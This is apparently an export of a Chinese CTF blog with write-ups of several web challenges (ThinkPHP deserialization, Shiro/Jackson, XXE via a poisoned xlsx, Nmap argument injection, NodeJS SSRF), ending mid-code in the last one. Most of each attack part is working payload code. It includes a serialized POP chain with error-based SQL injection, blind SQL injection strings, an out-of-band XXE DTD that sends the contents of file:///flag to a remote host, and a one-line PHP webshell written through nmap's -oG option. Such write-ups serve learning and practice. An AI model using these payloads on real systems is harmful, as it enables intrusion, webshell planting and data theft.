class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>\<span class="title">Imagick</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里记一下可以读/start.sh，读取配置文件你是啥也读不到的，start.sh里面</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">&#x27;\x02#!/bin/bash\n\nmysqld_safe &amp;\n\nmysql_ready() &#123;\n\tmysqladmin ping --socket=/run/mysqld/mysqld.sock --user=root --password=root &gt; /dev/null 2&gt;&amp;1\n&#125;\n\nwhile !(mysql_ready)\ndo\n\techo &quot;waiting for mysql ...&quot;\n\tsleep 3\ndone\n\nmysql -e &quot;ALTER USER \&#x27;root\&#x27;@\&#x27;localhost\&#x27; IDENTIFIED WITH mysql_native_password BY \&#x27;root\&#x27;;flush privileges;&quot; -uroot -proot\n\nif [[ -f /db.sql ]]; then\n    mysql -e &quot;source /db.sql&quot; -uroot -proot\n    rm -f /db.sql\nfi\n\nif [[ -f /flag.sh ]]; then\n\tsource /flag.sh\nfi\n\napache2-foreground\n&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>读到了继续下一步,读到有test库</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">PDO</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Mysql</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $options = <span class="keyword">array</span>(</span><br><span class="line">            PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; <span class="literal">true</span>    <span class="comment">// 开启才能读取文件</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">protected</span> $config = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>    =&gt; <span class="number">1</span>,</span><br><span class="line">            <span class="string">&quot;database&quot;</span> =&gt; <span class="string">&quot;mysql&quot;</span>,</span><br><span class="line">            <span class="string">&quot;hostname&quot;</span> =&gt; <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;hostport&quot;</span> =&gt; <span class="string">&quot;3306&quot;</span>,</span><br><span class="line">            <span class="string">&quot;charset&quot;</span>  =&gt; <span class="string">&quot;utf8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;root&quot;</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>\<span class="title">Memcache</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Imagick</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $img;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;img = <span class="keyword">new</span> Memcache();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Memcache</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $handle;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> Model();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>\<span class="title">Mysql</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $options   = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> $pk;</span><br><span class="line">        <span class="keyword">protected</span> $data = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> $db = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;db = <span class="keyword">new</span> Mysql();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pk = <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data[<span class="keyword">$this</span>-&gt;pk] = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;table&quot;</span> =&gt; <span class="string">&quot;mysql.user where 1=extractvalue(0x0a,concat(0x0a,(select substr((select group_concat(schema_name) from information_schema.SCHEMATA),50,90)  )))#&quot;</span>,</span><br><span class="line">                <span class="string">&quot;where&quot;</span> =&gt; <span class="string">&quot;1=1&quot;</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>\<span class="title">Imagick</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查到列是flag，表是flag</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">PDO</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Mysql</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $options = <span class="keyword">array</span>(</span><br><span class="line">            PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; <span class="literal">true</span>    <span class="comment">// 开启才能读取文件</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">protected</span> $config = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>    =&gt; <span class="number">1</span>,</span><br><span class="line">            <span class="string">&quot;database&quot;</span> =&gt; <span class="string">&quot;test&quot;</span>,</span><br><span class="line">            <span class="string">&quot;hostname&quot;</span> =&gt; <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;hostport&quot;</span> =&gt; <span class="string">&quot;3306&quot;</span>,</span><br><span class="line">            <span class="string">&quot;charset&quot;</span>  =&gt; <span class="string">&quot;utf8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;root&quot;</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>\<span class="title">Memcache</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Imagick</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $img;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;img = <span class="keyword">new</span> Memcache();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Memcache</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $handle;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> Model();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>\<span class="title">Mysql</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $options   = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> $pk;</span><br><span class="line">        <span class="keyword">protected</span> $data = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> $db = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;db = <span class="keyword">new</span> Mysql();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pk = <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data[<span class="keyword">$this</span>-&gt;pk] = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;table&quot;</span> =&gt; <span class="string">&quot;mysql.user where 1=extractvalue(0x0a,concat(0x0a,(select substr((select flag from test.flag),-20) )))#&quot;</span>,</span><br><span class="line">                <span class="string">&quot;where&quot;</span> =&gt; <span class="string">&quot;1=1&quot;</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>\<span class="title">Imagick</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="Javaweb"><a href="#Javaweb" class="headerlink" title="Javaweb"></a>Javaweb</h1><p>这题看赵总博客的时候感觉好简单，结果自己做的时候好难【】</p>
<p>打开就是让你访问/login，post过去发现有cookies=deleteme，所以说明是shiro权限问题</p>
<p>然后有个/json，直接访问/json是啥都没有的，post /login过去就说登陆失败，那么/json我们应该也没权限，所以猜测是有权限问题，可以通过url解析绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;8323fe99-49b2-449a-bbc2-100e2be3ca87.node3.buuoj.cn&#x2F;;&#x2F;json</span><br></pre></td></tr></table></figure>

<p>访问得到回显：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;timestamp&quot;</span>: <span class="number">1619772401954</span>,</span><br><span class="line">    <span class="attr">&quot;status&quot;</span>: <span class="number">400</span>,</span><br><span class="line">    <span class="attr">&quot;error&quot;</span>: <span class="string">&quot;Bad Request&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;exception&quot;</span>: <span class="string">&quot;org.springframework.http.converter.HttpMessageNotReadableException&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;message&quot;</span>: <span class="string">&quot;Required request body is missing: public java.lang.String com.ctf.controller.JsonController.json(java.lang.String) throws java.io.IOException&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;path&quot;</span>: <span class="string">&quot;/;/json&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>题目既然提示让我们post东西过去，我们就尝试着试试看。。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;timestamp&quot;</span>: <span class="number">1619772427543</span>,</span><br><span class="line">    <span class="attr">&quot;status&quot;</span>: <span class="number">500</span>,</span><br><span class="line">    <span class="attr">&quot;error&quot;</span>: <span class="string">&quot;Internal Server Error&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;exception&quot;</span>: <span class="string">&quot;com.fasterxml.jackson.databind.JsonMappingException&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;message&quot;</span>: <span class="string">&quot;Unexpected token (END_ARRAY), expected VALUE_STRING: need JSON String that contains type id (for subtype of java.lang.Object)\n at [Source: []; line: 1, column: 2]&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;path&quot;</span>: <span class="string">&quot;/;/json&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>百度看看jackson 有什么问题，找到这篇文章：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;182695</span><br><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;5792</span><br></pre></td></tr></table></figure>

<p>文章中提到jackson反射库会直接反序列化掉我们的输入..</p>
<p><img src="%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AFweb/image-20210430170011644.png" alt="image-20210430170011644"></p>
<p>但是文章中给出的操作是JDBC的，</p>
<p><strong><img src="%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AFweb/image-20210430170220729.png" alt="image-20210430170220729"></strong></p>
<p>再看看给出的几个例子，抄过来发现并没有啥用【</p>
<p><img src="%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AFweb/image-20210430171525984.png" alt="image-20210430171525984"></p>
<p>感觉自己不会的东西还是太多了。。。</p>
<p>接着记录mysql的语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from websites where id&#x3D;1||if((ascii(substr((select(group_concat(table_name))from(sys.schema_table_statistics_with_buffer)where(table_schema)&#x3D;(database())),1,1)))&gt;100,1,0);</span><br></pre></td></tr></table></figure>

<p>语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;39.96.91.106:5001&#x2F;?id&#x3D;%27||if((ascii(substr((select(group_concat(table_name))from(sys.schema_table_statistics_with_buffer)where(table_schema)&#x3D;(database())),1,1)))&gt;0,1,0)%23</span><br></pre></td></tr></table></figure>

<p>以及：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from websites where id&#x3D;1||if((ascii(substr((select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name)in(database())),1,1)))&gt;131,1,0);</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">||if((ascii(substr((select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name)in(database())),1,1)))&gt;1,1,0)</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>PHP</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>网鼎杯fileJava</title>
    <url>/2020/12/17/%E7%BD%91%E9%BC%8E%E6%9D%AFfileJava/</url>
    <content><![CDATA[<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ul>
<li>Java 文件泄露</li>
<li>XXE</li>
</ul>
<p>做题思路：</p>
<p>开局可以上传文件，下载的时候可以文件泄露</p>
<p><img src="image-20201217125640279.png" alt="image-20201217125640279"></p>
<p>这样的话就可以找到三个Java文件，分别dump源码，在文件中作者给出了提示</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">FileItem fileItem = (FileItem)var10.next();</span><br><span class="line">String filename;</span><br><span class="line">String fileExtName;</span><br><span class="line"><span class="keyword">if</span> (fileItem.isFormField()) &#123;</span><br><span class="line">    filename = fileItem.getFieldName();</span><br><span class="line">    fileExtName = fileItem.getString(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    filename = fileItem.getName();</span><br><span class="line">    <span class="keyword">if</span> (filename != <span class="keyword">null</span> &amp;&amp; !filename.trim().equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        fileExtName = filename.substring(filename.lastIndexOf(<span class="string">&quot;.&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">        InputStream in = fileItem.getInputStream();</span><br><span class="line">        <span class="keyword">if</span> (filename.startsWith(<span class="string">&quot;excel-&quot;</span>) &amp;&amp; <span class="string">&quot;xlsx&quot;</span>.equals(fileExtName)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Workbook wb1 = WorkbookFactory.create(in);</span><br><span class="line">                Sheet sheet = wb1.getSheetAt(<span class="number">0</span>);</span><br><span class="line">                System.out.println(sheet.getFirstRowNum());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvalidFormatException var20) &#123;</span><br><span class="line">                System.err.println(<span class="string">&quot;poi-ooxml-3.10 has something wrong&quot;</span>);</span><br><span class="line">                var20.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>故找到这个CVE：</p>
<p><a href="https://blog.csdn.net/weixin_42296449/article/details/88934150">https://blog.csdn.net/weixin_42296449/article/details/88934150</a></p>
<p>先写一个符合正则的的用户名evcel-xxx.xlsx,将其后缀修改为zip，加上POC之后再修改回去：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">convert</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://0.0.0.0/1.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="image-20201217130933478.png" alt="image-20201217130933478"></p>
<p>在反射过去的机子上面写一个1.dtd，令其远程实体调用</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">int</span> <span class="meta-string">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;0.0.0.0?p=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>随后上传文件即可：</p>
<p><img src="image-20201217131243814.png" alt="image-20201217131243814"></p>
]]></content>
      <tags>
        <tag>BUU</tag>
        <tag>Java</tag>
        <tag>XXE</tag>
      </tags>
  </entry>
  <entry>
    <title>网鼎杯朱雀组Nmap</title>
    <url>/2020/12/16/%E7%BD%91%E9%BC%8E%E6%9D%AF%E6%9C%B1%E9%9B%80%E7%BB%84Nmap/</url>
    <content><![CDATA[<h1 id="考点："><a href="#考点：" class="headerlink" title="考点："></a>考点：</h1><ul>
<li>NMAP 组件</li>
<li>PHP 短标签绕过</li>
</ul>
<h1 id="做题思路"><a href="#做题思路" class="headerlink" title="做题思路"></a>做题思路</h1><p>题目类似BUU曾经的题目Online Tool</p>
<p>此处使用system函数，应该可以进行命令执行，nmap参数中 -oG可以进行文件写入，此处我们写入一句话木马，最后payload为</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">?host=&#x27; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#x27;</span><br></pre></td></tr></table></figure>

<p>直接写入PHP被过滤，所以绕过一下就行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">host&#x3D; &#39; &lt;?&#x3D;&#96;$_POST[0]&#96; ;?&gt; -oG 1.phtml &#39;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>BUU</tag>
      </tags>
  </entry>
  <entry>
    <title>虎符2021_InternalSystem</title>
    <url>/2021/04/05/%E8%99%8E%E7%AC%A62021-InternalSystem/</url>
    <content><![CDATA[<p>比赛的时候完全没想到内网链接..登陆上去之后就卡住了，看了赵总的博客才懂，赵总tql!</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.zhaoj.in&#x2F;read-6905.html</span><br></pre></td></tr></table></figure>

<p>这道题目涉及的考点如下：</p>
<ul>
<li>NodeJS 弱类型比较</li>
<li>NodeJS代码审计</li>
<li>SSRF</li>
<li>NodeJS8的漏洞</li>
</ul>
<p>在/source下我们可以找到源码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> router = express.Router()</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">&#x27;axios&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> isIp = <span class="built_in">require</span>(<span class="string">&#x27;is-ip&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> IP = <span class="built_in">require</span>(<span class="string">&#x27;ip&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> UrlParse = <span class="built_in">require</span>(<span class="string">&#x27;url-parse&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123;sha256, hint&#125; = <span class="built_in">require</span>(<span class="string">&#x27;./utils&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> salt = <span class="string">&#x27;nooooooooodejssssssssss8_issssss_beeeeest&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> adminHash = sha256(sha256(salt + <span class="string">&#x27;admin&#x27;</span>) + sha256(salt + <span class="string">&#x27;admin&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> port = process.env.PORT || <span class="number">3000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">formatResopnse</span>(<span class="params">response</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">typeof</span>(response) !== <span class="keyword">typeof</span>(<span class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">JSON</span>.stringify(response)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SSRF_WAF</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> host = <span class="keyword">new</span> UrlParse(url).hostname.replace(<span class="regexp">/\[|\]/g</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> isIp(host) &amp;&amp; IP.isPublic(host)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">FLAG_WAF</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> pathname = <span class="keyword">new</span> UrlParse(url).pathname</span><br><span class="line">  <span class="keyword">return</span> !pathname.startsWith(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">OTHER_WAF</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> WAF_LISTS = [OTHER_WAF, SSRF_WAF, FLAG_WAF]</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="function"><span class="title">if</span>(<span class="params">req.session.admin === <span class="literal">undefined</span> || req.session.admin === <span class="literal">null</span></span>)</span> &#123;</span><br><span class="line">    res.redirect(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.redirect(<span class="string">&#x27;/index&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123;username, password&#125; = req.query;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">if</span>(<span class="params">!username || !password || username === password || username.length === password.length || username === <span class="string">&#x27;admin&#x27;</span></span>)</span> &#123;</span><br><span class="line">    res.render(<span class="string">&#x27;login&#x27;</span>)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> hash = sha256(sha256(salt + username) + sha256(salt + password))</span><br><span class="line"></span><br><span class="line">    req.session.admin = hash === adminHash</span><br><span class="line"></span><br><span class="line">    res.redirect(<span class="string">&#x27;/index&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/index&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="function"><span class="title">if</span>(<span class="params">req.session.admin === <span class="literal">undefined</span> || req.session.admin === <span class="literal">null</span></span>)</span> &#123;</span><br><span class="line">    res.redirect(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.render(<span class="string">&#x27;index&#x27;</span>, &#123;<span class="attr">admin</span>: req.session.admin, <span class="attr">network</span>: <span class="built_in">JSON</span>.stringify(<span class="built_in">require</span>(<span class="string">&#x27;os&#x27;</span>).networkInterfaces())&#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/proxy&#x27;</span>, <span class="keyword">async</span>(req, res, next) =&gt; &#123;</span><br><span class="line">  <span class="function"><span class="title">if</span>(<span class="params">!req.session.admin</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> res.redirect(<span class="string">&#x27;/index&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> url = <span class="built_in">decodeURI</span>(req.query.url);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">console</span>.log(url)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> status = WAF_LISTS.map(<span class="function">(<span class="params">waf</span>)=&gt;</span>waf(url)).reduce(<span class="function">(<span class="params">a,b</span>)=&gt;</span>a&amp;&amp;b)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">if</span>(<span class="params">!status</span>)</span> &#123;</span><br><span class="line">    res.render(<span class="string">&#x27;base&#x27;</span>, &#123;<span class="attr">title</span>: <span class="string">&#x27;WAF&#x27;</span>, <span class="attr">content</span>: <span class="string">&quot;Here is the waf...&quot;</span>&#125;)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> response = <span class="keyword">await</span> axios.get(<span class="string">`http://127.0.0.1:<span class="subst">$&#123;port&#125;</span>/search?url=<span class="subst">$&#123;url&#125;</span>`</span>)</span><br><span class="line">      res.render(<span class="string">&#x27;base&#x27;</span>, response.data)</span><br><span class="line">    &#125; <span class="function"><span class="title">catch</span>(<span class="params">error</span>)</span> &#123;</span><br><span class="line">      res.render(<span class="string">&#x27;base&#x27;</span>, error.message)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.post(<span class="string">&#x27;/proxy&#x27;</span>, <span class="keyword">async</span>(req, res, next) =&gt; &#123;</span><br><span class="line">  <span class="function"><span class="title">if</span>(<span class="params">!req.session.admin</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> res.redirect(<span class="string">&#x27;/index&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// test url</span></span><br><span class="line">  <span class="comment">// not implemented here</span></span><br><span class="line">  <span class="keyword">const</span> url = <span class="string">&quot;https://postman-echo.com/post&quot;</span></span><br><span class="line">  <span class="keyword">await</span> 